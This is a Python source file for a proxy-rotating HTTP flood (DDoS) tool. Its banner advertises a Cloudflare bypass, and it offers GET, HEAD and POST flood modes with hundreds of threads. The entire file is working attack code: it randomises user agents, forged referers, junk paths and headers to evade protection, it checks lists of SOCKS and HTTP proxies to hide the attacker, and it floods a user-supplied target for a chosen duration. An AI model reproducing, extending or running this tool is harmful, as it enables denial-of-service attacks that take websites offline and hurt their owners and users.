import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
from colorama import Fore
from urllib.parse import urlparse

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
white = Fore.WHITE

print(fr'''
>---------------------------------------------<
|{red}       ___     ______   _______ _______     {reset} |
|{red}      |   |   |   _  \ |   _   |   _   |    {reset} |
|{red}      |.  |   |.  |   \|.  |   |   1___|    {reset} |
|{green}      |.  |___|.  |    |.  |   |____   |    {reset} |
|{green}      |:  1   |:  1    |:  1   |:  1   |    {reset} |
|{green}      |::.. . |::.. . /|::.. . |::.. . |    {reset} |
|{green}      `-------`------' `-------`-------'    {reset} |
>---------------------------------------------<
|        {red} Version: {white}1.0.1 (03.05.2025)  {reset}       |
|              {red} Coded by {white}Lunar   {reset}             |
┌─────────────────────────────────────────────┐
│  We don't support attacks on: .edu hospital │
│     websites volunteering websites for      │
│            palestine and ukraine            │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│       {green}  [+] {red}Cloudflare Bypass{reset}           │
├─────────────────────────────────────────────┤
│    {red}  Link: {white}https://github.com/Sakuzuna/-/  {reset} │
└─────────────────────────────────────────────┘
''')

# User-Agents from cloudflare-bypass.py
UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.{} Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.{} Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.{} Mobile Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.{}; Media Center PC 6.0)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/{}.36 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 Chrome/103.0.5060.{} Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14592.79.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.{} Safari/537.36',
    'Mozilla/5.0 (Samsung SmartTV; U; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/92.0.{}.37 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.44.105 Chrome/105.0.5195.{} Safari/537.36',
]

# Referers from cloudflare-bypass.py
RF = [
    'https://www.facebook.com/l.php?u={}',
    'https://www.facebook.com/sharer/sharer.php?u={}',
    'https://drive.google.com/viewerng/viewer?url={}',
    'https://developers.google.com/speed/pagespeed/insights/?url={}',
    'http://help.baidu.com/searchResult?keywords={}',
    'http://translate.google.com/translate?u={}',
    'https://play.google.com/store/search?q={}',
    'http://www.google.com/translate?u={}',
    'http://www.google.com/?q={}',
    'http://www.bing.com/search?q={}',
]

# Additional random headers from cloudflare-bypass.py
RH = [
    'Accept-Ranges: none',
    'X-Frame-Options: DENY',
    'Pragma: no-cache',
    'Retry-After: 120',
    'Cache-Control: no-cache',
    'Accept: application/json, text/plain, */*',
    'X-Content-Type-Options: nosniff',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/json',
]

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.bing.com/search?q=",
]

mode = "cc"
url = ""
proxy_ver = "5"
brute = False
out_file = "proxy.txt"
thread_num = 800
data = ""
cookies = ""
append_junk = False  # New variable for junk string appending
requests_per_proxy = 5  # New variable for proxy rotation limit

strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice

def build_threads(mode, thread_num, event, proxy_type):
    if mode == "post":
        for _ in range(thread_num):
            th = threading.Thread(target=post, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cc":
        for _ in range(thread_num):
            th = threading.Thread(target=cc, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
            th = threading.Thread(target=head, args=(event, proxy_type,))
            th.daemon = True
            th.start()

def getuseragent():
    usr = random.choice(UA).format(str(random.randint(50, 150)))
    return usr

def randomurl():
    return str(Intn(0, 271400281257))

def GenReqHeader(method):
    global data, target, path, append_junk
    header = ""
    usr = getuseragent()
    ref = random.choice(RF).format(target)
    alt = random.choice(RH)
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        if cookies != "":
            connection += "Cookies: " + str(cookies) + "\r\n"
        accept = Choice(acceptall)
        header = f"User-Agent: {usr}\r\nReferer: {ref}\r\n{alt}\r\n{accept}{connection}\r\n"
    elif method == "post":
        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = f"Referer: http://{target}{path}\r\n"
        user_agent = f"User-Agent: {usr}\r\n"
        accept = Choice(acceptall)
        if data == "":
            data = str(random._urandom(16))
        length = f"Content-Length: {len(data)}\r\nConnection: Keep-Alive\r\n"
        if cookies != "":
            length += f"Cookies: {cookies}\r\n"
        header = f"{post_host}{accept}{refer}{content}{user_agent}{alt}\r\n{length}\n{data}\r\n\r\n"
    return header

def ParseUrl(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    else:
        print(fr"{red}> That{reset} looks like not a correct url.")
        exit()
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)

def InputOption(question, options, default):
    ans = ""
    while ans == "":
        ans = str(input(question)).strip().lower()
        if ans == "":
            ans = default
        elif ans not in options:
            print(fr"{red}> Please{reset} enter the correct option")
            ans = ""
            continue
    return ans

def cc(event, proxy_type):
    global append_junk, requests_per_proxy
    header = GenReqHeader("get")
    proxy = Choice(proxies).strip().split(":")
    add = "?" if "?" not in path else "&"
    event.wait()
    count = 0
    while True:
        s = None
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(100):
                if append_junk:
                    junk_path = path + add + ''.join(random.choices(strings, k=random.randint(5, 15)))
                else:
                    junk_path = path + add + randomurl()
                get_host = f"GET {junk_path} HTTP/1.1\r\nHost: {target}\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                count += 1
                if not sent or count >= requests_per_proxy:
                    s.close()
                    proxy = Choice(proxies).strip().split(":")
                    count = 0
                    break
            s.close()
        except:
            if s:
                s.close()
            proxy = Choice(proxies).strip().split(":")

def head(event, proxy_type):
    global append_junk, requests_per_proxy
    header = GenReqHeader("head")
    proxy = Choice(proxies).strip().split(":")
    add = "?" if "?" not in path else "&"
    event.wait()
    count = 0
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(100):
                if append_junk:
                    junk_path = path + add + ''.join(random.choices(strings, k=random.randint(5, 15)))
                else:
                    junk_path = path + add + randomurl()
                head_host = f"HEAD {junk_path} HTTP/1.1\r\nHost: {target}\r\n"
                request = head_host + header
                sent = s.send(str.encode(request))
                count += 1
                if not sent or count >= requests_per_proxy:
                    s.close()
                    proxy = Choice(proxies).strip().split(":")
                    count = 0
                    break
            s.close()
        except:
            s.close()
            proxy = Choice(proxies).strip().split(":")

def post(event, proxy_type):
    global requests_per_proxy
    request = GenReqHeader("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    count = 0
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(100):
                sent = s.send(str.encode(request))
                count += 1
                if not sent or count >= requests_per_proxy:
                    s.close()
                    proxy = Choice(proxies).strip().split(":")
                    count = 0
                    break
            s.close()
        except:
            s.close()
            proxy = Choice(proxies).strip().split(":")

def checking(lines, proxy_type, ms, rlock):
    global nums, proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        rlock.acquire()
        proxies.remove(lines)
        rlock.release()
        return
    err = 0
    while True:
        if err >= 3:
            rlock.acquire()
            proxies.remove(lines)
            rlock.release()
            break
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect(("1.1.1.1", 80))
            sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            if not sent:
                err += 1
            s.close()
            break
        except:
            err += 1
    nums += 1

def check_socks(ms):
    global nums
    thread_list = []
    rlock = threading.RLock()
    for lines in list(proxies):
        if proxy_ver == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms, rlock))
        elif proxy_ver == "4":
            th = threading.Thread(target=checking, args=(lines, 4, ms, rlock))
        elif proxy_ver == "http":
            th = threading.Thread(target=checking, args=(lines, 0, ms, rlock))
        th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.write(fr"{red}> Checked{reset} " + str(nums) + " proxies\r")
        sys.stdout.flush()
    for th in thread_list:
        th.join()
    print(fr"\r\n{red}> Checked{reset} all proxies, Total Worked:" + str(len(proxies)))
    with open(out_file, 'wb') as fp:
        for lines in list(proxies):
            fp.write(bytes(lines, encoding='utf8'))
    print(fr"{red}> They{reset} are saved in " + out_file)

def check_list(socks_file):
    print(fr"{red}> Checking{reset} list")
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list and ':' in i and '#' not in i:
            try:
                socket.inet_pton(socket.AF_INET, i.strip().split(":")[0])
                temp_list.append(i)
            except:
                pass
    with open(socks_file, "wb") as rfile:
        for i in temp_list:
            rfile.write(bytes(i, encoding='utf-8'))

def main():
    global proxy_ver, data, cookies, brute, url, out_file, thread_num, mode, target, proxies, append_junk, requests_per_proxy
    target = ""
    check_proxies = False
    proxy_type = 5
    period = 60

    print(fr"{red}> Mode:{reset} [cc/post/head]")
    mode = input(fr"{red}> Enter{reset} mode (cc/post/head): ").strip().lower()
    if mode not in ["cc", "post", "head"]:
        print(fr"{red}> Invalid{reset} mode. Exiting.")
        return

    url = input(fr"{red}> Enter{reset} target URL: ").strip()
    ParseUrl(url)

    proxy_ver = input(fr"{red}> Enter{reset} proxy version (4/5/http, default:5): ").strip().lower()
    if proxy_ver not in ["4", "5", "http"]:
        proxy_ver = "5"
    proxy_type = 5 if proxy_ver == "5" else 4 if proxy_ver == "4" else 0

    brute = input(fr"{red}> Enable{reset} brute mode (1 for yes, 0 for no, default:0): ").strip() == "1"

    thread_num = input(fr"{red}> Enter{reset} number of threads (default:800): ").strip()
    thread_num = int(thread_num) if thread_num and thread_num.isdigit() else 800

    cookies = input(fr"{red}> Enter{reset} cookies (optional): ").strip()

    data_path = input(fr"{red}> Enter{reset} path to data file (optional, only for post mode): ").strip()
    if data_path and mode == "post":
        try:
            with open(data_path, "r", encoding="utf-8", errors='ignore') as f:
                data = ' '.join([str(txt) for txt in f.readlines()])
        except:
            print(fr"{red}> Could{reset} not read data file. Proceeding without data.")

    append_junk = input(fr"{red}> Add junk strings to path? (y/n, default:n): ").strip().lower() == "y"

    requests_per_proxy = input(fr"{red}> Requests per proxy (default:5): ").strip()
    requests_per_proxy = int(requests_per_proxy) if requests_per_proxy and requests_per_proxy.isdigit() else 5

    out_file = input(fr"{red}> Enter{reset} proxies file name (default:proxy.txt): ").strip() or "proxy.txt"

    check_proxies = input(fr"{red}> Check{reset} proxies? (y/n, default:n): ").strip().lower() == "y"

    period = input(fr"{red}> Enter{reset} attack duration in seconds (default:60): ").strip()
    period = int(period) if period and period.isdigit() else 60

    if not os.path.exists(out_file):
        print(fr"{red}> Proxies{reset} file not found")
        return
    proxies = open(out_file).readlines()
    check_list(out_file)
    proxies = open(out_file).readlines()
    if not proxies:
        print(fr"{red}> There{reset} are no more proxies. Please provide a valid proxies list.")
        return
    print(fr"{red}> Number{reset} Of Proxies: %d" % (len(proxies)))
    if check_proxies:
        check_socks(3)

    proxies = open(out_file).readlines()

    if not target:
        print(fr"{red}> There{reset} is no target. End of process ")
        return

    event = threading.Event()
    print(fr"{red}-----------------------{reset}")
    print(fr"{red}> Building{reset} threads...")
    build_threads(mode, thread_num, event, proxy_type)
    event.clear()
    event.set()
    print("> Flooding...")
    time.sleep(period)

if __name__ == "__main__":
    main()
